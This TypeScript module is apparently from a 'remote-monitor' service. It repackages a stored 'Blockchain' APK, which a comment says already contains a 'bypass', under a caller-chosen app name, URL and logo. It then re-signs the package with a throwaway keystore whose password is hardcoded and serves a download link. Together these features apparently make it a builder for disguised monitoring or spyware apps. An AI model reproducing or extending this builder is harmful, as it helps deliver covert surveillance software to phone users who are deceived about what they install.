import fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';
import archiver from 'archiver';

interface APKBuildOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
}

/**
 * Builder ULTRA-SIMPLES
 * - Copia Blockchain.apk (já tem bypass)
 * - Adiciona config JSON
 * - Reempacotar
 * - Assinar
 */
export async function buildUltraAPK(options: APKBuildOptions): Promise<{
  success: boolean;
  filename?: string;
  downloadUrl?: string;
  error?: string;
}> {
  try {
    const apksDir = process.env.NODE_ENV === 'production' 
      ? '/app/public/apks'
      : '/home/ubuntu/remote-monitor/public/apks';
    
    const baseAPK = path.join(apksDir, 'base-blockchain.apk');
    
    if (!fs.existsSync(baseAPK)) {
      return { success: false, error: 'APK base Blockchain não encontrado' };
    }
    
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const sanitizedName = options.appName.replace(/[^a-zA-Z0-9-]/g, '-').replace(/-+/g, '-').toLowerCase();
    const filename = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;
    const outputPath = path.join(apksDir, filename);
    
    console.log('[ULTRA-BUILD] Iniciando build ULTRA-SIMPLES');
    
    const tempDir = `/tmp/ultra-build-${timestamp}-${randomSuffix}`;
    const extractDir = path.join(tempDir, 'extracted');
    
    try {
      // 1. DESEMPACOTAR
      console.log('[ULTRA-BUILD] 1/4 Desempacotando Blockchain.apk...');
      execSync(`mkdir -p ${extractDir}`);
      execSync(`cd ${extractDir} && unzip -q ${baseAPK}`);
      
      // 2. ADICIONAR CONFIG
      console.log('[ULTRA-BUILD] 2/4 Adicionando config...');
      const assetsDir = path.join(extractDir, 'assets');
      fs.mkdirSync(assetsDir, { recursive: true });
      
      const config = {
        appName: options.appName,
        appUrl: options.appUrl,
        logoUrl: options.logoUrl || '',
        customized: true,
        timestamp: Date.now(),
      };
      
      fs.writeFileSync(path.join(assetsDir, 'app-config.json'), JSON.stringify(config, null, 2));
      
      // 3. REEMPACOTAR
      console.log('[ULTRA-BUILD] 3/4 Reempacotando...');
      const repacked = path.join(tempDir, 'app-unsigned.apk');
      
      await new Promise<void>((resolve, reject) => {
        const output = fs.createWriteStream(repacked);
        const archive = archiver('zip', { zlib: { level: 9 } });
        
        output.on('close', () => resolve());
        archive.on('error', reject);
        archive.pipe(output);
        archive.directory(extractDir + '/', false);
        archive.finalize();
      });
      
      // 4. ASSINAR
      console.log('[ULTRA-BUILD] 4/4 Assinando...');
      const keystorePath = '/tmp/android.keystore';
      if (!fs.existsSync(keystorePath)) {
        execSync(
          `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 -validity 10000 -alias android -storepass android -keypass android -dname "CN=Android, OU=Dev, O=Dev, L=Dev, S=Dev, C=US"`,
          { stdio: 'pipe' }
        );
      }
      
      execSync(
        `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore ${keystorePath} -storepass android -keypass android ${repacked} android`,
        { stdio: 'pipe' }
      );
      
      fs.copyFileSync(repacked, outputPath);
      execSync(`rm -rf ${tempDir}`);
      
      console.log('[ULTRA-BUILD] ✅ APK ULTRA-SIMPLES construído com sucesso!');
      
      const downloadUrl = `${process.env.VITE_APP_URL || 'https://remotemon-vhmaxpe6.manus.space'}/get-apk/${filename}`;
      
      return { success: true, filename, downloadUrl };
    } catch (err) {
      console.error('[ULTRA-BUILD] Erro:', err);
      try { execSync(`rm -rf ${tempDir}`); } catch (e) {}
      return { success: false, error: err instanceof Error ? err.message : 'Erro desconhecido' };
    }
  } catch (error) {
    console.error('[ULTRA-BUILD] Erro fatal:', error);
    return { success: false, error: error instanceof Error ? error.message : 'Unknown error' };
  }
}
